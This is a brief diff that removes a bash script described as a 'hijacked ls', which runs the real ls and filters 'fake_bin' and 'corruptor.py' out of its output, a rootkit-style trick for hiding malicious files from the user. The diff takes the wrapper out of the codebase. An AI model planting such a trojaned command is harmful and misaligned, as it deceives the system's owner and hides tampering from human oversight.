@@ -1,5 +1,0 @@
-#!/bin/bash
-# Hijacked ls: Hide the fake_bin and corruptor.py from the user's view
-# We use the real ls but filter out specific patterns
-
-/bin/ls "$@" | grep -vE "fake_bin|corruptor.py"
